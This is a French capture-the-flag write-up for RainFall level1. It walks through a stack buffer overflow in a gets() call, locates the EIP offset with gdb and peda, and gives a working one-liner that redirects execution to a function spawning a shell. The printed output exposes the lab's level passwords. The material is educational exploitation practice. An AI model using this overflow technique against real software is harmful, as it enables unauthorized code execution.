# level1 :

pass : `1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a`

## Source :

```c
#include <stdio.h>

void main() {  // 0x08048480
	char string[64];  // esp+0x10 - size = 0x50-0x10
	gets(string);
}

void run() {  // 0x08048444
	fwrite("Good... Wait what?\n", 1, 19, stdout);
	system("/bin/sh");
}
```

## Recherche :

On voit que si on lui envoi une chaine très longue, le programme segfault.

```sh
(gdb) r < <(python -c 'print "A"*100')
Starting program: /home/user/level1/level1 < <(python -c 'print "A"*100')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Aussi on peut observer que le programme à planter car il a essayé d'aller executer l'adresse `0x41414141`, qui est "AAAA".

Pour faire ceci, c'est qu'on a réécrit dans le registre `EIP` qui indique où sera exécuté la prochaine partie du code.

Avec ces images, on comprends mieux comment ceci s'est passé :

![](https://www.corelan.be/wp-content/uploads/2010/09/image_thumb24.png)

![](https://camo.githubusercontent.com/3862e2874666eb632fad1ab3f16b420b3c558344/68747470733a2f2f692e696d6775722e636f6d2f527868674459762e706e67) 

On va donc chercher à partir de quel caractère on écrit sur l'`EIP`

```sh
(gdb) r < <(python -c 'print "A"*64 + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level1/level1 < <(python -c 'print "A"*64 + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"')

Program received signal SIGSEGV, Segmentation fault.
0x46454443 in ?? ()
```

On voit `0x46454443`, soit "CDEF", on a donc réécrit à partir du 64 + 10 + 2 = 76<sup>ème</sup> caractère.

#### PEDA USAGE

> Pour trouver ceci de manière plus rapide, il existe un outil de `peda` : `pattern` qui permet de créer des patterns et de les rechercher par la suite.
> - `pattern create <size>` pour la creation de pattern
> - `pattern search` pour retrouver la pattern

```sh
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r < <(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
Starting program: /home/kali/rainfall/level1 < <(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]                                                                    
EAX: 0xbffff230 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x0 
ECX: 0xb7fb7580 --> 0xfbad2088 
EDX: 0xbffff294 --> 0x0 
ESI: 0xb7fb7000 --> 0x1dfd6c 
EDI: 0xb7fb7000 --> 0x1dfd6c 
EBP: 0x65414149 ('IAAe')
ESP: 0xbffff280 ("AJAAfAA5AAKAAgAA6AAL")
EIP: 0x41344141 ('AA4A')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)                                                                   
[-------------------------------------code-------------------------------------]                                                                    
Invalid $PC address: 0x41344141
[------------------------------------stack-------------------------------------]                                                                    
0000| 0xbffff280 ("AJAAfAA5AAKAAgAA6AAL")
0004| 0xbffff284 ("fAA5AAKAAgAA6AAL")
0008| 0xbffff288 ("AAKAAgAA6AAL")
0012| 0xbffff28c ("AgAA6AAL")
0016| 0xbffff290 ("6AAL")
0020| 0xbffff294 --> 0x0 
0024| 0xbffff298 --> 0xb7fb7000 --> 0x1dfd6c 
0028| 0xbffff29c --> 0x0 
[------------------------------------------------------------------------------]                                                                    
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41344141 in ?? ()
gdb-peda$ pattern search
Registers contain pattern buffer:
EBP+0 found at offset: 72
EIP+0 found at offset: 76
Registers point to pattern buffer:
[EAX] --> offset 0 - size ~100
[ESP] --> offset 80 - size ~20
Pattern buffer found at:
0x0804a1a0 : offset    0 - size  100 ([heap])
0xbffff230 : offset    0 - size  100 ($sp + -0x50 [-20 dwords])
References to pattern buffer found at:
0xb7fb758c : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
0xb7fb7590 : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
0xb7fb7594 : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
0xb7fb7598 : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
0xb7fb759c : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
0xbffff0a4 : 0x0804a1a0 ($sp + -0x1dc [-119 dwords])
0xbffff148 : 0x0804a1a0 ($sp + -0x138 [-78 dwords])
0xbffff220 : 0xbffff230 ($sp + -0x60 [-24 dwords])
```

Où l'on retrouve bien le même résultat : `EIP+0 found at offset: 76`

```sh
(gdb) r < <(python -c 'print "\x90"*76+"ABCD"')
Starting program: /home/user/level1/level1 < <(python -c 'print "\x90"*76+"ABCD"')

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
```

On est bon, on doit juste remplacer "ABCD" par l'adresse de `run`. Aussi on remarque que l'adresse est inversée. C'est normal, on est en little endian.

Pour tester, on va mettre un breakpoint à la fonction `run`, et essayer d'accéder à l'adresse `0x804844a` :

```sh
(gdb) b run
Breakpoint 1 at 0x804844a
(gdb) r < <(python -c 'print "\x90"*76+"\x4a\x84\x04\x08"')
Starting program: /home/user/level1/level1 < <(python -c 'print "\x90"*76+"\x4a\x84\x04\x08"')

Breakpoint 1, 0x0804844a in run ()
(gdb) c
Continuing.
Good... Wait what?

Program received signal SIGSEGV, Segmentation fault.
0x0804847e in run ()
```

On est bon ! Il reste plus qu'à passer à l'exploit.

## Exploit :

```sh
level1@RainFall:~$ (python -c 'print "\x90"*76+"\x4a\x84\x04\x08"'; cat) | ./level1 
Good... Wait what?
whoami
level2
cd ../level2
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

----

## Documentation :

* [buffer-overflow-code](https://reverseengineering.stackexchange.com/questions/2995/illegal-instruction-exploiting-sample-buffer-overflow-code)
* [tutorial Exploit Stack Based Overflows](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
* [Comment passer les arguments au programme ?](https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection/13929#13929)
